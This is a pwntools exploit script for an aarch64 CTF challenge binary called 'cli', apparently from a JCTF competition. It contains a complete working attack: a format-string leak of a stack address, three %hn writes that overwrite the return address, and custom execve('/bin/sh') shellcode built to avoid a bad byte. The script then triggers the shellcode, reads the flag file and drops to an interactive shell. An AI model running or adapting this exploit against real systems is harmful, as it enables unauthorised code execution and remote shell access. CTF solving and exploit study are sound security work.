#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.update(arch="aarch64",os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+2900+0', '-e']
context.log_level = 'info'

exe = ELF('./cli')
libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')

if args.REMOTE:
  host, port = "arm.nc.jctf.pro", "5002"
else:
  host, port = "127.0.0.1", "1236"

p = remote(host,port)

# launch the binary before with
# socat TCP-LISTEN:1236,nodelay,reuseaddr,fork EXEC:'./run.sh'
#
# run.sh contains:    qemu-aarch64 -g 1235 -L /usr/aarch64-linux-gnu/ ./cli
#
# gdb running on port 1235 et socat waiting for connection on 1236
#

# looks like qemu-aarch64 always map PIE binary to 0x5500000000  (to be verified)
if args.GDB:
#  q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+2900+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/gef/gef.py' -ex 'set architecture aarch64' -ex 'file ./cli' -ex 'gef-remote localhost:1235' -ex 'b main' -ex 'b *0x0000005500000d4c' -ex 'c'", shell=True)
  q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+2900+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/pwndbg/gdbinit.py' -ex 'set architecture aarch64' -ex 'file ./cli' -ex 'target remote localhost:1235' -ex 'b main' -ex 'b *0x0000005500000d4c' -ex 'b *0x0000005500000c6c' -ex 'c'", shell=True)

# execve shellcode modified to avoir 0xa8 byte in (that does not pas..)
shellc = asm('''
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, xzr
    mov  x2, xzr
    add  x0, sp, x1
    mov x3,#0x6e
    mov x4,#0x6f
    add x8,xzr,x4
    add x8,x8,x3
    svc  #0x1337
''')

p.sendlineafter('login: ', 'admin')
p.sendlineafter('password: ', 'admin1')

p.sendlineafter('> ', 'mode advanced')
p.sendlineafter('> ', 'echo '+'%1$p.')

offset = 11

leak = int(p.recvuntil('.',drop=True),16)
stack_ret = leak-37
print('buffer stack address = '+hex(leak))
print('ret_address = '+hex(stack_ret))

# we write first 16bit of our shellcode address
print('leak+3 = '+hex(leak+3))
temp = (leak+offset) & 0xffff
payload = '%'+str(temp)+'c%47$hn'
payload = payload.ljust(16,'A')
payload += p64(stack_ret)
p.sendlineafter('> ', 'echo '+payload)

# we write next 16bit of our shellcode address
temp = ((leak+offset)>>16) & 0xffff
payload = '%'+str(temp)+'c%47$hn'
payload = payload.ljust(16,'A')
payload += p64(stack_ret+2)
p.sendlineafter('> ', 'echo '+payload)

# we write last 16bit of our shellcode address (would be enough, rest is zeroes)
temp = ((leak+offset)>>32) & 0xffff
payload = '%'+str(temp)+'c%47$hn'
payload = payload.ljust(16,'A')
payload += p64(stack_ret+4)
p.sendlineafter('> ', 'echo '+payload)

# calling exit will return to our shellcode
p.sendlineafter('> ', 'exit '+'A'*offset+shellc)

p.sendline('cat /pwn/flag.txt')

p.interactive()

